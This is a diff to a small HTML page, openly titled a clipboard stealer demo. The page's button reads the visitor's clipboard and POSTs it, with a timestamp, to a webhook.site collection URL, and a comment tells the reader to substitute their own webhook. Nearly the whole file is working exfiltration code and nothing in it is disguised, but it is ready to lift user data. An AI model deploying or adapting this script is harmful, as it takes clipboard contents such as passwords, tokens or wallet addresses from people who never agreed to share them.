@@ -2,16 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Clipboard Stealer Test (httpbin)</title>
+  <title>Clipboard Info Stealer Demo (Chrome Test)</title>
 </head>
 <body>
-  <h1>📋 Clipboard Stealer Demo (Testing)</h1>
+  <h1>🚨 Clipboard Info Stealer (Chrome Test)</h1>
   <button onclick="stealClipboard()">Steal Clipboard & POST</button>
   <pre id="output"></pre>
 
   <script>
     async function stealClipboard() {
-      const output = document.getElementById('output');
+      const output = document.getElementById("output");
 
       try {
         const data = await navigator.clipboard.readText();
@@ -23,7 +23,8 @@
           timestamp: new Date().toISOString()
         };
 
-        const webhookURL = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1";
+        // 🔁 ⛔ Replace the URL below with your actual Webhook.site URL
+        const webhookURL = "https://webhook.site/e9fe751d-ca09-45fb-bdd5-6742ffe0f4d7";
 
         const response = await fetch(webhookURL, {
           method: "POST",
@@ -33,12 +34,10 @@
           body: JSON.stringify(payload)
         });
 
-        const result = await response.json();
-        output.textContent += `\n\n✅ Sent to httpbin.\nResponse:\n` +
-          JSON.stringify(result.json, null, 2);
+        output.textContent += `\n\n✅ POST Sent! Status: ${response.status}`;
       } catch (err) {
         output.textContent += `\n\n❌ Error: ${err}`;
-        console.error("Fetch error:", err);
+        console.error("Fetch Error:", err);
       }
     }
   </script>
